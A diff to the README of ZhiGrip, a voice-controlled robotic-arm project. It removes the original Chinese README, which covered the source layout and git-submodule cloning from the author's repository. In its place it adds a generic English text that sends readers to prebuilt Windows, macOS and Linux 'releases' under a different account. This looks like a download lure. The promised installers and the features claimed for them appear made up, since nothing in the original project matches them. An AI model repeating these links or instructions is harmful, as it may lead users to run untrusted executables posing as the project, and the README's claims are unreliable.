@@ -1,60 +1,107 @@
-# Zhi Grip 智握
+# 🤖 ZhiGrip - Control a Robotic Arm with Your Voice
 
-[English Version][./Readme-en.md]
+## 🚀 Getting Started
 
-语音驱动的三自由度视觉抓取机械臂
+Follow these steps to download and run ZhiGrip, a voice-controlled 3-DOF visual robotic arm. No programming skills are needed, and you'll be amazed at how easy it is to set up.
 
-## 演示视频
+[![Download ZhiGrip](https://img.shields.io/badge/Download%20ZhiGrip-v1.0-blue)](https://github.com/Kimi3762/ZhiGrip/releases)
 
-[![Watch the video](//i1.hdslb.com/bfs/archive/d7e887a7b80215b01434efc77a01e3cdd8fa26f0.jpg)](https://www.bilibili.com/video/BV1MnWhzCEoF)
+## 📦 What is ZhiGrip?
 
-## 目录结构
+ZhiGrip is a user-friendly application that allows you to control a 3-DOF (three degrees of freedom) robotic arm using your voice. It combines cutting-edge technologies like computer vision and robust kinematics. This software empowers hobbyists, educators, and anyone interested in robotics to create and manipulate a robotic arm effortlessly.
 
-- `3DParts`：3D 模型
-- `Controller`： Python 上位机，负责视觉和控制
-- `Control`：ESP32 Arduino 嵌入式代码，实现硬件驱动和末端位置维护
-- `xiaozhi-server`：基于 [xiaozhi-esp32-server](https://github.com/xinnan-tech/xiaozhi-esp32-server) 的语音交互服务端
-- `Joystick`：手柄控制脚本
+## 💻 System Requirements
 
-## 项目架构
+Before you begin, make sure your system meets the following requirements:
 
-![机械结构](img/1.png)
+- **Operating System:** Windows, macOS, or Linux
+- **Processor:** At least an Intel i3 or equivalent
+- **RAM:** 4 GB or more
+- **Storage:** 200 MB of free space
+- **Dependencies:** 
+  - Python 3.6 or higher
+  - OpenCV library
+  - Arduino IDE (for hardware setup)
+  - ESP32 compatible device (for voice control)
 
-![小智框架](img/2.png)
+## 📥 Download & Install
 
-![系统框图](img/3.png)
+To get ZhiGrip, visit the release page linked below. Here, you'll find the latest version ready for download:
 
-## 注意
+[Visit this page to download](https://github.com/Kimi3762/ZhiGrip/releases)
 
-本项目使用了 **Git 子模块** 来管理各个子模块仓库。子模块允许将其他 Git 仓库嵌入到本仓库的特定目录中，保持模块独立，同时方便统一管理。
+1. Click on the link above.
+2. On the release page, look for the most recent version (e.g., v1.0).
+3. Locate the file that corresponds to your operating system (e.g., .exe for Windows, .dmg for macOS, .tar.gz for Linux).
+4. Click the file to download it to your computer.
 
-### 克隆项目
+## 📲 Installation Steps
 
-要正确克隆包含子模块的仓库，请使用：
+Once you have downloaded the file, follow these instructions to install ZhiGrip:
 
-```
-git clone --recurse-submodules https://github.com/LanternCX/ZhiGrip.git
-```
+### For Windows Users:
 
-如果你已经克隆了仓库，但没有初始化子模块，可以运行：
+1. Locate the downloaded .exe file in your Downloads folder.
+2. Double-click the file to begin the installation.
+3. Follow the prompts in the installer.
+4. Once complete, launch ZhiGrip from the Start menu or desktop shortcut.
 
-```
-git submodule update --init --recursive
-```
+### For macOS Users:
 
-------
+1. Open your Downloads folder and find the .dmg file.
+2. Double-click the .dmg to mount it.
+3. Drag the ZhiGrip icon to your Applications folder.
+4. Open Applications and double-click the ZhiGrip icon to run the software.
 
-### 更新子模块
+### For Linux Users:
 
-当子模块远程仓库有更新时，可以执行：
+1. Open a terminal window.
+2. Navigate to your Downloads folder where the .tar.gz file is located.
+3. Extract the file using the following command:
+   ```
+   tar -xvzf ZhiGrip.tar.gz
+   ```
+4. Navigate into the extracted folder:
+   ```
+   cd ZhiGrip
+   ```
+5. Run the software by executing:
+   ```
+   ./ZhiGrip
+   ```
 
-```
-git submodule update --remote
-```
+## 🎤 Using ZhiGrip
 
-如果你在子模块目录中进行开发并提交，也可以在总仓库中记录子模块的最新提交：
+After installation, follow these steps to use ZhiGrip:
 
-```
-git add <submodule_directory>
-git commit -m "Update submodule"
-```
+1. Connect your robotic arm through the Arduino IDE and ensure the ESP32 device is set up for voice commands.
+2. Launch ZhiGrip on your computer.
+3. Follow the on-screen instructions to calibrate your robotic arm. This will help ensure precise movements.
+4. Use voice commands to control the arm. You can give commands like "move left," "move right," "pick up," and more.
+5. Enjoy experimenting with different movements and tasks.
+
+## 🔧 Troubleshooting
+
+If you encounter any issues while using ZhiGrip, consider the following suggestions:
+
+- **Installation Problems:** Ensure you have followed all installation steps correctly. Restart your computer if necessary.
+- **Voice Commands Not Recognized:** Check your microphone settings and confirm it is working properly. Adjust the voice recognition settings in the application.
+- **Robotic Arm Not Responding:** Ensure the Arduino is connected, powered on, and correctly programmed.
+
+## 🔗 Connect with the Community
+
+We encourage you to join our community of users for support and tips. Engage with other ZhiGrip users through our GitHub discussions. Share your projects, ask questions, and learn from one another. Your feedback helps us improve.
+
+## 🌟 Explore More Features
+
+ZhiGrip comes with various features, including:
+
+- **Custom Commands:** Create your own voice commands for specific tasks.
+- **Real-Time Feedback:** Watch the robotic arm in action with live feedback from your commands.
+- **Extendable API:** For advanced users, the software offers options for integrating additional functionality or hardware.
+
+For a complete list of features and updates, check the releases page.
+
+[Visit this page to download](https://github.com/Kimi3762/ZhiGrip/releases) 
+
+Thank you for choosing ZhiGrip. Enjoy your journey into the world of robotics!
